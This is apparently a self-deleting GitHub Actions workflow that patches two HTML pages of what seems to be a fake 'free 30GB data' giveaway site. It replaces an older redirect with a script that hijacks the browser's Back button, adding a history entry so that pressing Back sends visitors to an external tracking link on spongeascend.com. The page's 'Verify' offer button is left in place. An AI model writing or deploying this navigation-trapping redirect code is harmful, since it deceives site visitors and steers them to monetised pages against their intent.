name: Fix back redirect safely

on:
  push:
    paths:
      - '.github/workflows/fix-back-redirect-v2.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Patch back navigation
        run: |
          python3 - <<'PY'
          from pathlib import Path

          files = [
              Path('index.html'),
              Path('Samu Kyautar 30GB Data A Kowane Layi.html'),
          ]

          start_marker = '    <script>\n        window.onhashchange = function() {'
          end_marker = '        })(window);\n    </script>'
          replacement = '''    <script>
        (function () {
            var backRedirectUrl = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
            if (window.history && window.history.pushState) {
                window.history.pushState({}, "", window.location.href);
                window.addEventListener("popstate", function () {
                    window.location.replace(backRedirectUrl);
                }, { once: true });
            }
        })();
    </script>'''

          for path in files:
              text = path.read_text(encoding='utf-8')
              start = text.find(start_marker)
              if start == -1:
                  raise SystemExit(f'{path}: legacy back block start not found')
              end = text.find(end_marker, start)
              if end == -1:
                  raise SystemExit(f'{path}: legacy back block end not found')
              end += len(end_marker)
              updated = text[:start] + replacement + text[end:]

              if 'noBackPlease' in updated or 'global.onhashchange' in updated:
                  raise SystemExit(f'{path}: legacy hash code remains')
              if 'window.onhashchange = function()' in updated:
                  raise SystemExit(f'{path}: legacy hash redirect remains')
              if updated.count('window.location.replace(backRedirectUrl)') != 1:
                  raise SystemExit(f'{path}: back-only redirect check failed')
              if updated.count('id="offer2"') != 1:
                  raise SystemExit(f'{path}: Verify button changed unexpectedly')

              path.write_text(updated, encoding='utf-8')

          if files[0].read_bytes() != files[1].read_bytes():
              raise SystemExit('HTML files no longer match')
          PY

      - name: Commit fix
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html "Samu Kyautar 30GB Data A Kowane Layi.html"
          git rm .github/workflows/fix-back-redirect-v2.yml
          git rm -f .github/workflows/fix-back-redirect.yml || true
          git commit -m "Make back redirect trigger only on Back"
          git push origin HEAD:main
